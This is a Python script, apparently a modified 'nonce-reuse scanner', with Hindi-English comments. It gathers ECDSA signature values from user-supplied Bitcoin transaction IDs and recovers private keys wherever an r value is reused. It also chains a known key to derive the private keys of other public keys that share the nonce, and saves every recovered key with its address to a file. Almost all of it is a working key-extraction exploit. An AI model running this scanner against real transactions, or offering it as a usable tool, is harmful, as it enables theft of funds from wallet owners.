#!/usr/bin/env python3
"""
rsz_auto_modified.py — Modified nonce-reuse scanner

Changes:
- Fix: getz_input.py se ek txid ke andar ke sabhi inputs (Input Index #0, #1, …)
  ab alag-alag signatures ke roop me capture kiye jaate hain.
- Agar same r alag-alag public keys ke saath mile, to user se ek private key
  manga jaata hai aur usse baaki private keys derive kiye jaate hain.
"""

import subprocess
import sys
from collections import defaultdict
from ecdsa import SigningKey, SECP256k1
import hashlib
import base58

# secp256k1 order
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def run_getz(txid: str):
    """Run getz_input.py -txid <txid> and parse ALL input signatures."""
    try:
        out = subprocess.check_output(
            ["python3", "getz_input.py", "-txid", txid],
            text=True,
            stderr=subprocess.DEVNULL
        )
    except subprocess.CalledProcessError as e:
        print(f"Error running getz_input.py for txid {txid}:", e)
        return []

    sigs = []
    r = s = z = pub = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("R:"):
            r = int(line.split()[1], 16)
        elif line.startswith("S:"):
            s = int(line.split()[1], 16)
        elif line.startswith("Z:"):
            z = int(line.split()[1], 16)
        elif line.startswith("PubKey:"):
            pub = line.split()[1]
            # ek complete record ban gaya
            if None not in (r, s, z, pub):
                sigs.append({"txid": txid, "r": r, "s": s, "z": z, "pub": pub})
                r = s = z = pub = None  # reset next input ke liye
    return sigs


def hex_pref(x: int) -> str:
    return '0x' + format(x, 'x')


def modinv(a: int, m: int = N) -> int:
    a = a % m
    if a == 0:
        raise ZeroDivisionError('inverse does not exist')
    return pow(a, -1, m)


def recover_k_and_d_from_two(s1: int, s2: int, z1: int, z2: int, r: int):
    ds = (s1 - s2) % N
    if ds == 0:
        raise ValueError('s1 == s2 (mod n); cannot compute k')
    k = (z1 - z2) * modinv(ds) % N
    d = ((s1 * k - z1) * modinv(r)) % N
    return k, d


def priv_to_compressed_pubhex(d: int) -> str:
    sk = SigningKey.from_secret_exponent(d, curve=SECP256k1)
    vk = sk.verifying_key
    px = vk.pubkey.point.x()
    py = vk.pubkey.point.y()
    prefix = 2 + (py & 1)
    return format(prefix, '02x') + format(px, '064x')


def pubkey_to_address(pub_hex: str) -> str:
    pub_bytes = bytes.fromhex(pub_hex)
    sha = hashlib.sha256(pub_bytes).digest()
    ripe = hashlib.new('ripemd160', sha).digest()
    prefix = b'\x00' + ripe
    chk = hashlib.sha256(hashlib.sha256(prefix).digest()).digest()[:4]
    return base58.b58encode(prefix + chk).decode()


def try_recover_d2_with_d1(sig1, sig2, d1):
    r = sig1['r']
    s1 = sig1['s']
    z1 = sig1['z']
    s2 = sig2['s']
    z2 = sig2['z']

    if s1 % N == 0:
        raise ValueError('s1 == 0 mod n')

    k0 = (z1 + (r * d1)) * modinv(s1) % N
    candidates = []
    for kc in (k0, (N - k0) % N):
        d2 = ((s2 * kc - z2) * modinv(r)) % N
        pubhex = priv_to_compressed_pubhex(d2)
        candidates.append((kc, d2, pubhex))
    return candidates


def save_match(info: str):
    with open("matches.txt", "a") as f:
        f.write(info + "\n\n")


def parse_priv_input(s: str) -> int:
    s = s.strip()
    if s.startswith('0x') or s.startswith('0X'):
        return int(s, 16)
    return int(s, 0)


def main():
    print('\n=== ECDSA Nonce Reuse Auto Scanner (modified) ===\n')
    try:
        num = int(input('Enter number of txid: ').strip())
    except Exception:
        print('Invalid number')
        sys.exit(1)

    txids = []
    for i in range(num):
        txid = input(f'Txid {i+1}: ').strip()
        txids.append(txid)

    sigs = []
    for tx in txids:
        infos = run_getz(tx)
        if not infos:
            print(f'Skipping tx {tx} due to parse error')
            continue
        sigs.extend(infos)   # extend with multiple inputs

    if not sigs:
        print('No valid signatures extracted. Exiting.')
        sys.exit(1)

    groups = defaultdict(list)
    for s in sigs:
        groups[s['r']].append(s)

    for r_val, items in groups.items():
        print(f"\n=== Analyzing group r={hex(r_val)} ===")
        pub_groups = defaultdict(list)
        for it in items:
            pub = it['pub']
            if pub.startswith('0x'):
                pub = pub[2:]
            pub_groups[pub].append(it)

        recovered = {}
        for pub, siglist in pub_groups.items():
            if len(siglist) >= 2:
                try:
                    k, d = recover_k_and_d_from_two(siglist[0]['s'], siglist[1]['s'],
                                                    siglist[0]['z'], siglist[1]['z'], r_val)
                    addr = pubkey_to_address(pub)
                    print(f"[Option1] Recovered from pub {pub} -> k={hex(k)}, d={hex(d)}, address={addr}")
                    recovered[pub] = (k, d)
                    tx_list = [t["txid"] for t in siglist]
                    save_match(f"[Option1]\nTxids: {tx_list}\nPubKey: {pub}\nAddress: {addr}\nPrivateKey: {hex(d)}")
                except Exception as e:
                    print(f"[Option1] Could not recover for pub {pub}: {e}")

        if len(pub_groups) > 1:
            print('[Info] Multiple distinct public keys share this r value.')

            if recovered:
                for d1_pub, (k_known, d1) in recovered.items():
                    for target_pub, target_sigs in pub_groups.items():
                        if target_pub == d1_pub:
                            continue
                        sig1 = pub_groups[d1_pub][0]
                        sig2 = target_sigs[0]

                        try:
                            cand_list = try_recover_d2_with_d1(sig1, sig2, d1)
                        except Exception as e:
                            print(f"[Option2] Error trying for pub {target_pub}: {e}")
                            continue

                        for kc, d2, pubhex in cand_list:
                            print('-------------------------')
                            print(f'[Option2] Using d1 from pub {d1_pub} to attempt pub {target_pub}')
                            print('k candidate =', hex_pref(kc))
                            print('d2 candidate =', hex_pref(d2))
                            print('derived pub =', pubhex)

                            if pubhex.lower() == target_pub.lower():
                                addr = pubkey_to_address(pubhex)
                                print('=> MATCH FOUND!')
                                tx_list = [t["txid"] for t in pub_groups[target_pub]]
                                save_match(f"[Option2]\nTxids: {tx_list}\nPubKey: {target_pub}\nAddress: {addr}\nPrivateKey: {hex(d2)}")

            pubs = list(pub_groups.keys())
            for i in range(len(pubs)):
                for j in range(i+1, len(pubs)):
                    pub1 = pubs[i]
                    pub2 = pubs[j]
                    sig1 = pub_groups[pub1][0]
                    sig2 = pub_groups[pub2][0]

                    prompt = (f"\nEnter private key (hex or decimal) for txid {sig1['txid']} (pub {pub1})\n"
                              f"to derive private key for txid {sig2['txid']} (pub {pub2}),\n"
                              "or press Enter to skip: ")
                    pk_input = input(prompt).strip()
                    if not pk_input:
                        continue
                    try:
                        d1 = parse_priv_input(pk_input)
                    except Exception:
                        print('Invalid private key format. Use hex (0x...) or decimal integer.')
                        continue

                    try:
                        cand_list = try_recover_d2_with_d1(sig1, sig2, d1)
                    except Exception as e:
                        print(f"[Interactive Option2] Error trying for pub {pub2}: {e}")
                        continue

                    for kc, d2, pubhex in cand_list:
                        print('-------------------------')
                        print(f'[Interactive Option2] Using provided d1 for pub {pub1} to attempt pub {pub2}')
                        print('k candidate =', hex_pref(kc))
                        print('d2 candidate =', hex_pref(d2))
                        print('derived pub =', pubhex)

                        if pubhex.lower() == pub2.lower():
                            addr = pubkey_to_address(pubhex)
                            print('=> MATCH FOUND!')
                            tx_list = [t["txid"] for t in pub_groups[pub2]]
                            save_match(f"[Interactive Option2]\nTxids: {tx_list}\nPubKey: {pub2}\nAddress: {addr}\nPrivateKey: {hex(d2)}")
                        else:
                            print('Derived public key does not match target pubkey. Candidate saved to output for inspection.')

        else:
            print('[Info] No cross-pub Option2 candidates here.')

    print('\nDone. Matches saved in matches.txt')


if __name__ == "__main__":
    main()
